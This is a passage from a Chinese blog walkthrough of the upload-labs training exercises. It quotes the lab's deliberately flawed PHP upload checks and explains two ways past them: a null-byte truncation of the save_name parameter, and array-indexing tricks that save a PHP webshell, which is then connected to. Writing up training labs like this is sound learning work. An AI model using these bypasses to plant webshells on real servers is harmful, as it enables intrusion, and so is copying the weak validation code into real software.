&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = pathinfo(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;,PATHINFO_EXTENSION);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; .&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;禁止保存为该类型文件！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;分析，move_uploaded_file()函数中的img_path是由post参数save_name控制的，&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;因此可以在save_name利用00截断绕过：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;首先上传一个图片马&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313100100590.png&#34; alt=&#34;image-20210313100100590&#34;&gt;&lt;/p&gt;
&lt;p&gt;再进行 hex 00 截断&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313100210338.png&#34; alt=&#34;image-20210313100210338&#34;&gt;&lt;/p&gt;
&lt;p&gt;进行上传，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313100235376.png&#34; alt=&#34;image-20210313100235376&#34;&gt;&lt;/p&gt;
&lt;p&gt;菜刀连接，拿到 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313100516143.png&#34; alt=&#34;image-20210313100516143&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二种方法，传一个 REQUEST 请求，进行浏览器 GET 得 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313101545220.png&#34; alt=&#34;image-20210313101545220&#34;&gt;&lt;/p&gt;
&lt;p&gt;更改 hex 00 截断上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313101617346.png&#34; alt=&#34;image-20210313100443380&#34;&gt;&lt;/p&gt;
&lt;p&gt;浏览器进行 GET 请求访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313101647574.png&#34; alt=&#34;image-20210313101647574&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看到 flagvalue.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313101719963.png&#34; alt=&#34;image-20210313101719963&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-20数组绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-20数组绕过&#34;&gt;#&lt;/a&gt; Pass-20 (数组绕过)&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//检查MIME&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$allow_type&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;image/jpeg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;image/png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;image/gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!in_array(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;variable&#34;&gt;$allow_type&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;禁止上传该类型文件!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//检查文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_name&amp;#x27;&lt;/span&gt;]) ? &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;] : &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_name&amp;#x27;&lt;/span&gt;];  判断save_name是否为空,否则用POST传递&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!is_array(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = explode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;, strtolower(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;	explode - 把字符串打散为数组,以点分隔  strtolower — 将字符串转化为小写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; = end(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$allow_suffix&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$allow_suffix&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;禁止上传该后缀文件!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = reset(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;) . &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;[count(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; reset() 输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; count() 函数返回数组中元素的数目。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; .&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件上传成功！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;请选择要上传的文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;如果不是数组则将其拆成数组，然后数组最后一个的值(end函数就是取数组最后一个的值)同白名单做比较，符合jpg、png、gif中的一种就允许上传了。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  在允许上传之后还要把数组的值拼接在一起对文件进行重命名。所以我们可以构造save_name[0]=a.php/  save_name[1]置为空  save_name[2]=jpg(一个白名单的合法后缀)。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  这样的话，reset($file)取的是数组的第一个元素即cs.php/，然后接了一个&amp;#x27;.&amp;#x27;符号，之后又将数组最后一个元素内容拼接到一起。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  可能有的人会疑问数组最后一个值不是jpg吗？其实当我们只设置了两个数组元素的时候，数组的元素个数就只有两个了。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  既然一共只有两个元素，这里就是$file[2-1]也就是$file[1]。因此拼接的就是空的，最终得到的文件名就是a.php/.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  对于像a.php/.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的/.。如此一来我们上传到服务器的文件还是被重命名为了php后缀。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313105140361.png&#34; alt=&#34;image-20210313105140361&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210313105520758.png&#34; alt=&#34;image-20210313105520758&#34;&gt;&lt;/p&gt;
&lt;p&gt;eval 和 system 区别&lt;/p&gt;
